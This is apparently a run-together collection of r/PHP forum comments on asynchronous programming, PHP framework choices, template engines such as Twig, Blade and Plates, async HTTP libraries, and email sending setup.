Asynchronous and parallel programming are both forms of concurrency ... I'll try to explain ... (this may not work, I'm not good at explain) The following diagram shows the (familiar) synchronous model of execution, lets call it program X, has three tasks to complete: --- || | 0 | || | 0 | || | 0 | || | 0 | || | 0 | \ / | 0 | || |---| || | 1 | || | 1 | || | 1 | Time | 1 | || | 1 | || | 1 | || |---| || | 2 | \ / | 2 | || | 2 | || | 2 | || | 2 | || | 2 | \ / --- || Nice and simple, this is what most of us are used too. The following diagram shows a parallel model of execution, in this model there are three threads of execution running separate tasks: ----------- | 0 | 1 | 2 | | 0 | 1 | 2 | | 0 | 1 | 2 | | 0 | 1 | 2 | | 0 | 1 | 2 | | 0 | 1 | 2 | --- ------- We can actually see that these tasks run truly concurrently, concurrently with respect to time, reducing the overall time it takes to execute the three tasks. The following diagram shows the asynchronous model: --- || | 2 | || | 1 | || | 0 | || | 1 | || | 0 | \ / | 1 | || |---| || | 1 | || | 2 | || | 1 | Time | 0 | || | 1 | || | 2 | || |---| || | 0 | \ / | 0 | || | 2 | || | 2 | || | 2 | || | 0 | \ / --- || We can see that the tasks are interleaved by the programmer, forcing the tasks to execute concurrently with respect to each other, but it seems to take as long as the synchronous model to execute. Where asynchronous concurrency is useful is usually in the case of I/O bound code, where a considerable amount of time for each task is actually spent waiting. The synchronous diagram for I/O bound code would look like: --- || | 0 | || | - | || | 0 | || | 0 | || | - | \ / | 0 | || |---| || | - | || | - | || | 1 | Time | 1 | || | 1 | || | 1 | || |---| || | 2 | \ / | - | || | - | || | 2 | || | 2 | || | 2 | \ / --- || We can see that there is time spent doing literally nothing while waiting for subsystems and or hardware to do their job ! The asynchronous model has our instructions interleaved allowing us to eliminate waiting and continue executing another tasks instructions, making the diagram for asynchronous I/O bound code look like: --- || | 2 | || | 0 | || | 1 | || | 0 | \ / |---| || | 2 | || | 1 | Time | 0 | || | 2 | || |---| || | 1 | || | 1 | || | 2 | || | 0 | \ / --- || So asynchronous concurrency can also reduce the time it takes to execute the same I/O bound instructions by executing another tasks instructions.
Errors can be handled "conventionally" through return as well. So why have exception handling in the first place? It's just a matter of convenience. Having the information about the exceptional condition bubbles through multiple layers of code is easier. I don't really see a reason why we should deal with serious problems in a way and less serious problems in a different way. The concern about running the catch block multiple times is valid. I think that can be alleviated by having a separate base class for purely informational reports. Objects based on it will then slip right pass any catch(Exception $e) blocks.
I already know PHP. I was wondering if there was a way to make the steep learning curve of the frameworks a little less steep. i.e. would learning one before the other help?
Zend Framework 2 and Laravel use Symfony components under the hood. Symfony would be my suggestion for you as the first framework to grasp. Keep in mind that it has a higher learning curve then the others.
* Symfony * Laravel * Phalcon * Zend Those are the major ones.
In just getting started in php- completed codeacademy and moving onto some other basic online courses to get a handle of the syntax and such. My question is, what is the next step? I'm unsure what area to progress into without being thrown completely out of my depth (which seems like the case a lot of the time) 
A PHP Redmine port would be nice. It's the best open source issue tracker IMO. Installing the Rails version on a new server can be quirky especially since I don't know Ruby/Rails.
My bad. =)
There is a port done here. I'm not sure how complete it is https://github.com/yandod/candycane
I would say like 95% complete as I'm using it for some time.Even wrote own translation to polish language.
Yeah, you can do proper(ish) async with multi curl. All the examples just show looping until all the requests are done which I've always thought is lame as hell, but you can processes as soon as each request is finished. 
I think you misunderstood me. I'm not butthurt about a loss of ad revenue. I'm just not willing to cater to noscript users. The web is moving forward and it's not going to be held back by a minority of users who have JS disabled.
Personally I'd love to see HTTP message objects built into PHP, similar to what is being proposed by the PHP-FIG in [PSR-7](https://github.com/php-fig/fig-standards/blob/master/proposed/http-message.md), albeit that's not really a package per say, but more a set of interfaces. The $_SERVER, $_POST and $_GET global vars are a mess IMHO, and moving this to an object oriented representation of a request/response would be much nicer. We could build libraries around these interfaces, which would also make requests easier to mock in tests.
Well, from a business point, it kind of does make sense. I mean, if a JS rich UI benefits 99.9% of my users, then it doesn't make sense for me to spend time trying to cater for those who are knowledgeable enough to know that the site isn't working because they have JS disabled. Many developers are finally coming out of the dark old days when we had to use multiple hacks, just to get simple things working across multiple browsers. That's why the thought of having to cater for an extension or a disabled setting is so unappealing. 
I think you'd be interested in the Symfony [HttpFoundation](https://github.com/symfony/HttpFoundation) component. It does _exactly_ what you're proposing.
Yep, I am interested, and that's exactly what I've been using for quite some time actually. :)
Did you mean that'd it be great if something like would be in the PHP core?
Too late. Instructions unclear, penis stuck in asynchronous socket.
Yes, haha. Just realizing now that I misunderstood the original question. I thought the question was "what libraries do you want to see included directly in PHP?". I'll have another coffee now. Nothing to see here.
Please no on the future front. Seriously. They are a bad abstraction. They represent a value in the future, which you need to ask if it's ready. They are a nightmare to work with. A far better abstraction is the monadic Promise. It lets the abstracted value decide when to resolve itself. It makes for chaining values and building up sequences of actions FAR easier and easier to follow. So please, reconsider using Futures. They need to be put to rest, not spread further...
When you say "add processes", do you mean fire the result into a queue for handling in another process? Edit: thinking about it, I guess this is all going to be most useful in backend queued processes, since the reads are blocking (you can't let an end user hang around while you wait for the response to ten asynchronous Guzzle requests). So one process would fire the requests off, then each returning result would queue up another process to handle it, unless those processes are also async requests. Oh, my brain hurts.
Can we, as a community, get past this tendancy to just "port what other platforms have done"? Seriously. If there's a good library for Node, then just use Node. We don't need copies of every idea in every language because *reasons*. Tooling is a great example. Composer is amazing. But does it need to be PHP specific? Hell no. But we have a tendency to want to "make it our own" and port. Instead, try some new ideas. Try building something original. Try being creative rather than just reactionary. Try experimenting. Most of the time you will fail. But when you succeed, you'll do something great. Because it was you who did it.
I mean, you can get results as they come in, do something with them, be it parse it and use it, forward it to a queue or whatever. It can take as long as you want, the other responses will just wait.
Quake 2
Can't wait!!!!
Totally agree Anthony, and yet there isn't wrong with learning from other languages. For example, just because there's a good HTTP abstraction library in Node, doesn't mean I don't still need one for PHP. There's a balance here.
Oh, don't get me wrong. I'm not saying we shouldn't be learning from them. What I'm more talking about is ports. Where the APIs are the same, the language is just different. Implementing something similar, but designed for PHP, is a complete different story. That blurs the line between port and write, which is incredibly useful. I was just more pointing at the seemingly overall tendency to just copy language X into PHP...
I have to say that I, personally, think it's quite fun to try and implement something in PHP that I found for another language. And if it proves useful, because 1) it's a familiar language and 2) it's already available in my current stack (I don't want to have to fuck around with RVM, because I just want to use a quick utility library) I shouldn't have to stop myself because "it's already done in another language". How crazy would it be to have to think: "Welp, this library looks really useful but I'd better not use it because it's node and, well, we don't have that in our current stack nor do our developers have the time to learn a new language"? Besides, it can be _quite_ the learning experience to try and port something from i.e. Ruby or Python to PHP __and__ keeping it testable at the same time.
Again, I totally agree. It's a very valid point. In fact, I hate seeing some new library pop up with no description other than "It's just like X from Rails". That doesn't really help me.
Twig, as its a lot more mature than Blade, and i like the syntax better. Using `@`'s all over the place makes me feel like i'm suppressing errors everywhere.
I prefer blade, even though I feel twig has more features. I think its because of the syntax I prefer the @ signs rather than { % I do primarily work with Laravel so there maybe so bias but I have used both.
&gt; Symfony looks rock solid, especially with LTS releases, which would be a bonus for us. But the learning curve seems so steep. Every some of the basic tutorials confuse me. I think it will be difficult for me and my team to get up to that level in a reasonable time. The learning curve isn't that bad, you just have to have patience for it. &gt; Zend Framework seems fine as well. We don't hear as much from it, but it still seems alive and stable. The learning curve doesn't seem as bad as Symfony, but steeper than Laravel (CodeIgniter). Other than that, I don't have much of an opinion on it. And i'd actually say Zend's is just as steep(not steep) as symfony's, if not steeper.
A Standalone github issues, with more features.
Twig. More feature, more mature, more strict with what a view should be, and not based on regexes that keep crashing all the time and limit what the language can do. And I'm a Laravel lover but just, not of Blade in particular.
I wonder if we're going to start see more of the PHP community move to logicalness templates over the new couple years. It seems like a natural transition from compiled templates. I'm curious, do you have any example code that you've created using Mustache that I could see? I always wonder where you end up putting those very simple display/output logic, such as formatting a date, or uppercasing text, or the like.
I'd just as soon upgrade my laravel installs to 5.x. I believe you need to install a service providers to account for changes in the folder structure, after that it looks like it's going to be just a few tweaks. I don't mind if older versions aren't supported in the super long term so long as the upgrade process isn't too difficult. Which it hasn't been. Once a version comes out with non-upgradable BC breaks, then I believe the Laravel community will have to address the LTS issue in a more deliberate way.
Congrats on the release! 
Hey thanks for the feedback, but I think you misunderstood what Plates is. Plates is a native PHP template system, meaning there's no new syntax. It's just plain old PHP. Some developers prefer native PHP templates over compiled templates, like Twig. Plates makes working with these templates much more enjoyable.
Honestly most projects -- in my personal opinion -- do not need a `full stack` framework like symfony, zend or laravel. I would look more into smaller frameworks such as [slim](http://www.slimframework.com/) or perhaps [silex](http://silex.sensiolabs.org/) aka mini symfony. There is also [aura v2 packages](http://auraphp.com/packages/v2) which is less a framework and more a collection of framework like feature in separate packages that can be used independently or together. I'd say make sure to identify the things you want your framework to do for you. Routing, session handling, maybe templating and logging. Create that list then check what does the chosen framework do for you. If it does a lot more than you might be adding a lot of complexity for no reason. The reason I like the micro frameworks is it is simple to find a package via composer that does anything extra you want and just include it in your composer.json If you do go with slim or silex the one thing that is a bit more difficult than the other frameworks is that because they are so flexible its hard to find tutorials on how best to set up your application. Their examples all have the entire application in a single file but I believe those are more to express the simplicity of the framework and is not recommend for anything of significant size. 
Those are PHP shorthand tags. The reason behind this is most likely for performance - no parsing of the template has to be done to print variables. It is literally directly executed PHP code. In the second scenario, a parser would have to evaluate the entire HTML page and look specifically for the tags you specified. I personally think Plates is great - it's the way PHP was intended to be used. That is, as a templating language. Features such as the [Short Open Tag](http://php.net/manual/en/ini.core.php#ini.short-open-tag) and [Alternative Syntaxes](http://php.net/manual/en/control-structures.alternative-syntax.php) were designed for these purposes. Edit: Wrong link to alternative syntax page!
Pure PHP is still there waiting to be used if that's your bag. :) 
I am in a similar situation to you. I work with the same size team, and we were stuck using a custom framework that was written in 2004. After we write an app, we support it for a long time, as well. Last year I started investigating frameworks. We tried ZF2 first, for a few months, but it never felt right. We tried Symfony after that, and it's been awesome since then. There is definitely a learning curve, as there is with anything new, but I don't think it's bad. For us, having something that we knew was stable and would be around a long time was paramount. Laravel seems cool and is nice, but that ruled it out for us.
I'll use an analogy: I built a pretty slick PDF producer &amp; emailer for our customer service dept to very easily and quickly email customers documents pertaining to their interactions with our business. I'm sure TCPDF/FPDI and PHPMailer have released several new versions since I wrote it in early 2012, but I don't particularly care. The system still works and works awesome. I have more important new projects to work on, I don't have time to upgrade the libs on a perfectly functioning system, especially when I have no business need to do so. Outside of an egregious security flaw, if an existing system is on Laravel 3.x and works awesome (for example), why bother upgrading the framework? So many people discuss framework upgrades as if the previous version of code they used in their project will just stop working. In many projects, once the thing is feature complete to what you needed to solve the business problem, it's a set-it-and-forget-it and just use the damn thing scenario. Obviously one has to be cognizant of any remote security exploits, but as I suggested, I'm sure if such a super-heinous flaw popped up, Taylor would fix it ... unless it was related to a fundamental architecture issue that would be a nightmare to fix. Most bugs aren't like that.
I agree! After using mustache with ember I love it :) 
That's the same as Twig though isn't it? Twig prevents you from adding PHP to a .twig file, whereas you can add PHP file to a .blade.php file. 
I prefer Blade on the basis that I can do PHP in these files as they are actually blade.php files. Twig files are not php files and doing inline PHP (although not good practice) becomes far more difficult. At least in blade I have more freedom to run any PHP functions I may need, whereas Twig has wrapped many of these into it's own functions. 
I prefer http://handlebarsjs.com/ to Mustache. Adds some more features I find very handy like the ability to easily add your own helpers (eg. for formatting dates).
I use git, no effort required
Definitely nothing wrong with using older libs, especially if they're mature and don't give you any trouble! Also especially if you built them and know the ins and outs! There is no upgrade path for Laravel 3.x to 4.x, so you would definitely have to make do with it, whatever happened. I'm not sure what support there is for 3.x, tbh. But for 4 ... for example, this app I'm working on was on v4.1 until just recently. I ran into a bug and found it was fixed for 4.3 but not for 4.1. So to fix the bug, I had to upgrade to 4.3. I was putting off upgrading until I absolutely had to. What I'm saying is, I didn't mind that bug not being fixed in 4.1 so long as it was reasonably easy to upgrade to 4.3. Fortunately, it was!
http://cdn.niketalk.com/9/95/95bacade_76bbf455_chair.gif
I really love that with Twig you can use variables without the $ sign. 
yeah.
You can't insert plain PHP into twig, but you can still add _logic_ to your template. Anthony is making the point that logic belongs in a _controller_ (or, code in general) and not in your template. For example, something like this should be handled in code, not in your template: {% if session.expired %} {{ redirect('/logout') }} {% endif %} 
I don't have any public. But what I tend to do is create a "View" or "Layout" object, which gets the data, and populates the template. So it'll have a render() method, which does all of that logic and returns the rendered template (which could be HTML, XML, JS, etc). The point of the object is that it abstracts everything...
Cool, thanks for explaining
Ok that makes a ton more sense, I totally missed the boat on that.
Ahh got it, hadn't even thought about it in that performance regard. Thanks for the clarification.
http://i.imgur.com/JkOzKst.gif
I would argue doing inline PHP in a template is a very bad idea and I would prefer a template engine that wouldn't enable writing bad code.
I'm sure somebody will suggest a micro-framework in a few minutes and right after: "you'll just add stuff on silex until it becomes symfony"
Well, to be fair, I'm even talking about things like: {% filter upper %} This text becomes uppercase {% endfilter %} And {{ data|convert_encoding('UTF-8', 'iso-2022-jp') }} And {{ "now"|date('d/m/Y H:i', timezone="Europe/Paris") }} And non-trivial conditionals: {% if 'Fabien' starts with 'F' %} {% endif %} And macros. And expressions. Etc. Etc. Etc... All taken as examples from [twig's docs](http://twig.sensiolabs.org/doc/templates.html).
For truly logic-less templating try xtemplate. I've been using it for years &amp; there's total separation of presentation and logic. I can't speak to its performance compared to other libs, but it has never been a bottleneck for me. 
$http_response_header. Let's not even go there.
I would totally recommend CakePHP, especially the new version 3.0. CakePHP is the longest living of all PHP frameworks, so that is a good guarantee that it is still going to stay for much longer. Older versions are still being supported for more than 4 years, so you don't have the fear that your cod will be stop being patch for security problems or bugs in the core. You will probably find CakePHP 3 similar to Laravel in many aspects, but there are some features that makes it unique and stand out from the pack. First its documentation is super detailed and extensive, it contains tutorials and examples for each part of the framework. It is also relatively easy to grasp, it is a framework that is usually picked by newcomers to PHP. Having a friendly community behind also helps with the learning part.
For projects where I'm doing the templating AND the PHP I would agree, but when you have a big team and you need to let the designers modify the template, ie change the date formatting then it's easier to use twig. All they need to do is look at the twig documentation and not bother the PHP devs. You could argue they should just read the PHP documentation, but it's a lot easier to digest a subset over the entire language. Just my 2 templates.
Find something that works for you. I've used Capistrano for one project, pure git based for another and even fabric. I find it's highly dependant on the type of project you work on. 
I second both these points - looking at a micro-framework, and not to assume that you need a large framework. I'd been using CodeIgniter for a number of years and was used to it - but for a new project (an internal business web app, probably ultimately 150 tables or so) I wanted to move away from it for the reasons stated. I tried many frameworks and none gave me a particularly good vibe (although I quite liked Phalcon conceptually). Then realised that in my previous apps, I'd basically built a framework - form processing, interface, higher-level database stuff, rendering, reporting, etc - on top of CI, having extended the basic basic MVC classes. The main CI stuff I was using was the basics - routing, input handing, DB library etc. So then looked at micro-frameworks, eg Slim Framework, which is nice. Looked into how it worked... and ultimately just made my own MVC framework. Conceptually similar to CI but refactored with proper namespaces, autoloading, etc (after getting many ideas from [PHP The Right Way](http://www.phptherightway.com/)) Added a few extra libraries, again similar to CI but including my own extensions that I'd added along the way. The main thing I laboured over was whether to use an ORM or not - it's a can of worms, granted, and there are some good ones - but I decided that I preferred writing SQL, so added a fairly straightforward PDO wrapper for common DB operations. I'm the first to say I'm not the most advanced PHP coder - but I've now got a framework which performs well, is simple, understandable, upgradeable and with no overhead; my actual app code is lean and to the point; and I learned a lot more than I'd have done so using an existing framework. Again, maybe you will need to use one - but don't take it as a given.
This seems pretty great! One thing, though: http://platesphp.com/templates/layouts/ The page title says "Variables".
If you evaluate the templates final appearance and how clean it looks then mustache is the winner.
How do you feel about codeigniter? 
Hey thanks, good catch! [Fixed](https://github.com/thephpleague/plates/commit/96a028e12a360d8cfe428624dec106c20ae08071). ;)
To add to this, on page http://platesphp.com/templates/functions/ you have for the first example: &gt; &lt;p&gt;Hello, &lt;?=$this-&gt;escape(name)?&gt;&lt;/p&gt; I've not tried using the library, but I would imagine this would cause a compiler issue on `name` without the $ or quotes. Other then that, this looks almost exactly how I have written my own "template" engine (which wasnt quite as fleshed out as plates) for my own custom framework. I plan on looking into plates more and replacing mine with it. 
pain
No love for HAML?
Sold. Can you provide an example of escaping for different context, if it doesn't bother you too much?
But performance obviously is not a problem with compiled templates.
This
http://i.imgur.com/siQUomy.jpg
Do you have a simple example of a loop equivalent? Say you have an array that you want to output as a standard list, how does that work?
i started to use plates with 1.x and as soon as a new project needs just a little templating and i want to keep it clean and lean i always recommend plates (- : keep up the good work! 
Sometimes....?
agreed. Maybe start with Symfony Components to get familiar with them, then move to the entire framework as-needed, and at that point it'll be easier as well.
Why?
As promissed, the first article is here: http://www.reddit.com/r/PHP/comments/2hxg6u/generate_strings_based_on_regular_expressions/.
&gt; switching to a strictly promise based system would basically negate the need for Guzzle to have an event system, \o/ &gt; which would be too much of a breaking change, so I'm not too keen on that. :-P 
Don't forget about SemVer And homestead just did what puphpet does, but super specific.... &gt;But, he's free to do thing his way. Yes he is.
Well, if this isn't __exactly__ what I was looking for! Does it do OAuth and stuff like Guzzle, or should I do that myself?
Here's the documentation for the escape filter http://twig.sensiolabs.org/doc/filters/escape.html. Some very simple examples: &lt;div id="{{ block_id|escape }}"&gt;&lt;/div&gt; &lt;!-- Escapes using "html" strategy --&gt; &lt;script&gt; var siteUrl = '{{ app.site_url|escape('js') }}'; // Escaping using the JavaScript strategy &lt;/script&gt; &lt;style&gt; .foo-element { background-image: url("{{ foo.background|escape('css') }}"); /* CSS strategy */ } &lt;/style&gt; Some other thoughts: Blade is fantastic if you're looking for a language similar to PHP-based templates. It provides conveniences for some of the most common things you do with PHP templates, such as capturing blocks of content, checking if a variable is set, and displaying something else if not, echoing things out (i.e. {{ $var }}, {{{ $var }}}, and {!! $var !!} in Laravel 5). It's basically PHP with some syntax sugar to simplify things. Really easy to get start with if you're comfortable with PHP. Twig is an entirely different language, with a lot more functionality. If you're going to have non PHP developers working on the site (i.e. designers, front end devs), then they'll love using Twig, as it's simpler than writing PHP templates (for them at least), and provides many features tailored to front end development. It also hides complexity really well. You can pass it a context with a lot of complexity (e.g. a set of objects populated via an ORM), and the template creators can make use of them, without having to know how everything works, or whether you need to access something as an array, as a property, or check if something even exists first.
Well, for what it's worth, [MtHaml](https://github.com/arnaud-lb/MtHaml) is well maintained (last commit 11 days ago) and works pretty flawlessly in my experience. 
Theres not much love for smarty in the PHP community, but I've been using it for 10 years. Very performant and logical, and for the most part, I like the syntax Don't rule it out just to be a cool kid, is all Im saying 
Apparently you've never worked with ExpressionEngine's template language. It has this kind of crap built in...
Somebody get Rasmus... :-)
I personally recommend against using Zend Framework 2. If you do not already have someone who's an extreme professional at Zend Framework 2 and knows every good practice and knows exactly how to structure code in it and what every class does, everyone is going to be tired of trying to find the best practice way of doing things, and they will resort to bad practice shortcuts which will lead to inconsistency and your code will be a huge mess. The fact that the ZF2 documentation is appalling contributes to this. Laravel truly is amazing. If you want to give your colleagues something they might love, this would be the best gift. Unfortunately it is true that Laravel seems to evolve way too fast, and that it might actually be a better choice for personal projects rather than en masse for many long living projects for clients. Precisely what you are afraid of. I cannot comment on Symfony since I haven't used it, but from I can gather, it's slightly less (overly) flexible than ZF2 in a good sense, has great documentation, and has a lot of resources available for its library online since many other frameworks use them (e.g. Laravel and Silex). If you really really want to use Symfony 2, I'd hire someone good at it to teach your team. Otherwise it's an unnecessary jump in complexity for your team I think. /r/Nilithus is right about Slim and Silex. I'd personally recommend those for the reasons Nilithus mentioned too. They don't change too much, they're lightweight and easy to debug, and there's no problem even in making larger projects with them, so even that isn't out of the question with these frameworks. You're definitely going to love using your code a lot more than if you'd use ZF2. Yii has gone out of fashion if that matters to you. Otherwise I don't know anything about it. Phalcon was hot for a while about a year ago due to being really fast as a C extension, but we have HHVM now that bascally turns every framework into Phalcon if speed is what you really need, without losing the ability to debug the framework as a bonus.
Indeed, I consider myself fortunate to have been able to avoid EE (so far...).
Twig allows you to wrap your own functions as well.
Currently you should probably do Oauth stuff yourself - I have a library to make turn a service description (with the same syntax as the Guzzle service service description) into an actual API: https://github.com/danack/artaxservicebuilder An example API produced to consume a large part of the Github API is at: https://github.com/Danack/GithubArtaxService To be clear, the service builder generates an actual API that looks like: $command = $githubAPI-&gt;listRepoTags($accessToken, $repoOwner, $repoName); you can then either just execute the request synchronously, asynchronously with a callback or generate the request and dispatch it yourself. Having an actual API service with functions and proper parameters is not only far more 'reasonable' than the Guzzle service builder - where everything it done via arrays - but it also allows you to modify requests yourself....rather than having to jump through a libraries event system. However the ArtaxServiceBuilder is weeks away from being production ready - it's just something to play around with at the moment. But Artax itself is just days away from being production ready. 
Concrete5.
Well, partly, I think. Assigning a new name to the pattern we already use is a great thing, so we don't have to keep abusing MVC. But the catch (at least for me) is the responder part, because it doesn't document current practice; it advocates something new. Personally, I'm still undecided on the idea of the whole HTTP response being the view. In theory, it makes absolute, perfect sense. But in practice, I look at some of the example code, and I have trouble spotting the benefit. Is it more flexible? Can we use the same responder for multiple actions? Or can an action interchangeably use one of several responders? Is there a scenario where we would even want to? Each action has strong ties to its associated response. Or is the code easier to read and understand when it's factored into action/responder? Might be personal taste, but it seems harder to follow to me.
You want to set an SPF record for "domaina.com" whitelisting the IP address of the "Domain B" SMTP server. That would be your best bet. 
I use Blade because I use Laravel and... good enough. But I would have to say Twig is a more mature and feature rich option for templating. That said, much of what I do now the templates are actually Handlebars for Ember JS. PHP is more of an API backend thing.
About damn time. So much knowledge was senselessly lost when they were disabled.
Hey thanks so much!
Thanks ;)
To be honest, those are all view related logic, and they should NOT be in the controller. Having any of the above logic in the controller is like designing a whole web page with inline styles as opposed to using CSS. 
CI, YII etc are last generation so the only real contenders are Symfony, Zend, and Laravel. You could look at micros, but there's no point, you don't gain anything by cutting half the framework out except the need to reinvent those bits again. So: Laravel, it's nice, has a lower barrier to entry, but it's more opinionated, has a dev team of 1 person who works part time, and a reputation for using some strange patterns to get things done. Zend2 is very similar to Symfony2, but less mature and with a smaller community. Symfony2 is the only choice in my mind. It's mature, has a massive community and dev commitment from Sensio. It has a slightly higher learning curve because they provide 8 ways to do any one thing and don't hold your hand, but once you get past that it's plain sailing. You will need an experienced dev on the team to help out new comers and look after the nastier bits like security, but from my experience people just love working with it once they get over the initial hurdle.
I've been working for years with inline PHP in templates, and except for the occasional Junior Dev trying to fetch data in there, it's been one less moving-part to manage in our application. At this point, I'm a pretty big advocate of PHP in template over other methods. What are the biggest arguments against? Are most of them solved by competent developers (which I know is hard to get enough of).
If you never try anything new, you're not going to advance significantly. I think it was a good experiment as it required users to dig a little into the framework (it's fairly friendly when you figure out which facades map to which classes), which could help their own understanding. Simply preventing creation of new issues would have been a better approach though (if GitHub allowed that).
His POV, as with all things, is "fuck you."
Twig allows you to open templates to non developers. 
Ah, I guess it would really depend on one having that need. I can see where it would be really useful in those cases.
Can for me?
I am the team leader at a firm about the same size as the one you describe. We were at this juncture over a year ago and after looking at various frameworks including Zend, Laravel, CI, CakePHP and Symfony we chose Symfony and in hindsight it was a great choice. Symfony is well architected, feature rich, extensible and the documentation is great. The community is vibrant and the Symfony components have seen very wide adoption throughout the open source community, including in other frameworks like laravel. I consider this last point to be a major bonus because it means we have experience with part of the code base in Drupal, PHPBB and a number of other pieces of software that we come across in the PHP world. Although the learning curve is somewhat steep, I think its not much different when compared to other full stack frameworks. Many other frameworks just dont have the same feature list that symfony does. Also I would say that we would have described the learning curve as steep in part because we were coming from a CMS as a platform background where much of the code was procedural and not well architectured (lots of global functions/variables without clear boundaries between concerns like templating, db access, validation, etc.). While symfony's feature set is large the degree to which it is broken down into small components and the degree to which the architecture leverages established patterns makes it much easier to understand, because the organization just makes sense. I do think it may have been worthwhile to hire a consultant that was already familiar with the framework when we started. I think we could have reduced the ramp up time considerably and also avoided painful mistakes in terms of best practices. I would highly recommend reading through popular bundle code like FOSUserBundle if you adopt symfony to learn from their architecture and implementation. If you are interested in any guidance or consulting from someone who is very well versed with Symfony, AdminBundle and the Symfony CMF (which is what our custom CMS is built on) feel free to pm me. Good luck with your search! There are a lot of great options out there, which wasn't true with PHP even a few years ago.
Neither. They both boil down to needlessly inventing a new language for no good reason.
You typically use a view model when you use a "logic-less" (I hate that term) template system. It's just one more layer of abstraction, and it has its nice points, especially when you do stuff like working on separate mobile websites. But at the same time, I find the benefit of keeping your transformations split very questionable when you're looking at things like basic transformations of text. I really can't think of a valid reason why "I want this text to be uppercase when presented via this template" should be anywhere other than the template.
Oh look another thread about template engines. All this "community" is good for is arguing editors and frameworks. 
I enjoyed reading, I'm not very experienced with complier and parsers so my own attempt at a [reverse regex](https://github.com/icomefromthenet/ReverseRegex), I aimed low on supported expressions for those that easily identifiable. I never tested for performance but assume its poor. 
ember is handlebars, but yeah.
Alternatively MailGun- the free plan gives you 10,000 emails/month. 
slightly off topic, but has anyone tried [plates](http://platesphp.com/)?
I don't think they understood your humor.
Sorry, but this is definitely the wrong answer. MX records deal with locating the correct server to deliver inbound email.
I love mandrillapp.com for transactional email. It's free for the first 12k or 14k emails per month, the API is good, and the Laravel framework supports it out of the box, although you didn't say what, if any, framework you're using.
.... only 300 files ?! Sounds like it's small enough to be refactored to me with some global project settings at the top of every file and judicious use of require/includes, etc. Sure it's not small -- but it's not Linux source tree big either.
Django, probably not. Flask, maybe. Flask is Jinja2, which is Django templates made better, so it allows somewhat more "code" in templates than django would. No clue if either of them would let you modify the response like that though. Doesn't seem like they would,
Credit is due for realizing Laravel 4,3 should have been 5. Taylor listened and I'm sure will learn from that.
uh, no. no credit due, for doing something he should've been doing for the beginning. You don't get a trophy for doing something everyone else has already done.
Amazon SES with a 3rd party service works really well too. I use Sendy. Only like $0.40 per 10k emails. Super cheap. 
I haven't ever made this connection before, mostly because I haven't seen @ in php code in years. but I have to ask: what hell hole of a code base did you come from that used @ that much, and please say you've moved onto a better place. 
`@` has always been synonymous (to me) with error suppression, regardless of the last place I saw it, or how often i've seen it.
Heh, touche. Brain was on the incoming server, not outgoing. My bad.
i was making an analogy. Again, it was a decision that he should have made long before, and shouldn't get recognition for finally supporting it. On top of that, I'm still not positive he's following SemVer. I'll have to wait to see it in practice with him for a bit before I believe it.
HAML is pretty cool, but we're sadly lacking in good implementations!
Check out [Laravel](http://laravel.com).
Honestly, I'd love to hear FabPot's response to this....
Silex is awesome for stuff like this. Http://silex.sensiolabs.org
[Slim Framework](http://www.slimframework.com/) is really nice. I'm currently developing a website with it and it's been pretty easy.
We are currently doing this with symfony2 and the fosrestbundle and fosjsroutingbundle (sorry, no links due to writing this via mobile). Works awesome using annotations for routing. Easy to define PUT, POST, GET &amp; DELETE api calls. If you use the nelmio documentation you can also send request via the sandbox mode aswell.
* http://fabien.potencier.org/article/34/templating-engines-in-php * http://fabien.potencier.org/article/35/templating-engines-in-php-follow-up
Since you can add php tags to your blade templates it in no way adds inflexibility to php templates.
&gt; because it doesn't document current practice; it advocates something new. Not sure I understand. May be you could expand a bit what you mean by not following the best practices ? &gt; Personally, I'm still undecided on the idea of the whole HTTP response being the view. In theory, it makes absolute, perfect sense. But in practice, I look at some of the example code, and I have trouble spotting the benefit. Is it more flexible? &gt; Can we use the same responder for multiple actions? I will say yes / no. It depends may be the right answer. &gt; Or can an action interchangeably use one of several responders? Here also I guess yes. If I understand you correctly you are talking about rendering `/blog` in different formats like xml, json, html. Let the BrowseAction be used with a factory to create the appropriate responder. So yes it can make use of the same action. &gt; Is there a scenario where we would even want to? Somethings I noticed are when you are using an MVC'ish say many actions in same class, and making use of Dependency Injection containers and not using it as service locators you may need to inject the objects that are not needed. In that case it seems to me one action class per method seems perfect fit. If we look at the microframeworks, mostly they are using some what the same approach having a closure acting as a single class. &gt; Each action has strong ties to its associated response. Probably not really. In my view, mostly the responder has the strong ties to response. &gt; Or is the code easier to read and understand when it's factored into action/responder? Might be personal taste, but it seems harder to follow to me. I agree it is about personal taste. I do agree it is hard when we are coming from single class for multiple actions and building bunch of other classes it may be hard. Mostly my assumption is for we have been doing the MVC for a long time and seeing the newer variants are not digestible.
I have and I enjoy plates. 
There is one good reason in that they prevent templates from wildly exceeding their responsibilities. When you see something horrifying like a template with an embedded database query you appreciate that kind of thing. Of course most templating engines start exceeding the kind of work they should be doing but that's a different debate.
The article starts with the entirely wrong premise: &gt;So, you think PHP is a templating engine? It's the wrong question to ask, and it assumes there's a problem with *templating engines*. There isn't. There are plenty of examples of templating engines out there which don't have to invent a language to function. It then goes on to make other assumptions: &gt;And a template language is something that helps you to write templates that respects this separation of concerns A template engine should not need to "help" you separate concerns - this is the developer's job, not the template engine's job. The template engine's *only* job should be rendering templates. There is no reason to artificially limit anything if the developer maintains even a small modicum of discipline. &gt;The PHP language is verbose. You need no less than 14 characters just to output a simple variable (and no, using the more compact &lt;?= shortcut is not an option): &lt;?= is not an option? This is from 2009, so we can probably forgive Fabien for that comment, but it absolutely *is* an option. &gt;And PHP becomes ridiculously verbose when it comes to output escaping (and yes, escaping variables coming from an unsafe source is mandatory nowadays) It's ridiculously verbose if you decide to not write any kind of helpers in to your template engine. Again, the argument here isn't against template engines, it's against template *languages*. I could go on picking apart the arguments in this article - some have some justification, most don't have as much justification as he'd like to believe. The point here is that all these features (yes, even the revered template inheritance model) can be achieved without inventing a new language.
&gt;I really can't think of a valid reason why "I want this text to be uppercase when presented via this template" should be anywhere other than the template. Styling should be achieved by a stylesheet (text-transform) but on a more fundamental level the question is, why is our code not providing data in the form it needs to be?
Twig, for sure. I've used both a lot, and I'm currently having to use blade for a laravel project. One thing blade does allow for is using PHP in the templates. I know you shouldn't be doing this, but for some form templates I had to (A refactor has changed this). Other than that, I feel as though blade is just a lesser language. I don't really like the syntax, especially if you need to do inline ifs, you need to leave unwanted whitespace so the template still parses. Using twigs filters and functions just feels a lot nicer, and not having to use $s when referencing variables is nice, too. I can probably think of a fair few more examples, but really, they aren't comparable languages on my side, given the choice I'd always choose twig, and struggle with blade.
